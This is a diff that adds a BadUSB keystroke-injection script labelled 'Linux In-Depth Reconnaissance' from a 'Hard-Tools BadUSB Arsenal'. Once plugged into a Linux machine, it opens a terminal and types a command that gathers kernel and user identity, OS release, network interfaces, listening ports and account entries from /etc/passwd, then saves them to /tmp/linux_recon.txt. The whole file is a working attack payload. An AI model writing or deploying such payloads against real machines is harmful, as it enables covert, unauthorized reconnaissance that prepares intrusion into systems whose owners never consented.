@@ -1,0 +1,7 @@
+REM Linux In-Depth Reconnaissance
+REM Hard-Tools BadUSB Arsenal
+DELAY 1000
+CTRL ALT t
+DELAY 800
+STRING (echo "=== HOST & KERNEL ==="; uname -a; whoami; id; echo "=== OS RELEASE ==="; cat /etc/os-release 2>/dev/null; echo "=== NETWORK INTERFACES ==="; ip -br a 2>/dev/null || ifconfig; echo "=== OPEN PORTS ==="; ss -tuln 2>/dev/null || netstat -tuln; echo "=== USERS ==="; cut -d: -f1,3,6,7 /etc/passwd) > /tmp/linux_recon.txt && cat /tmp/linux_recon.txt
+ENTER
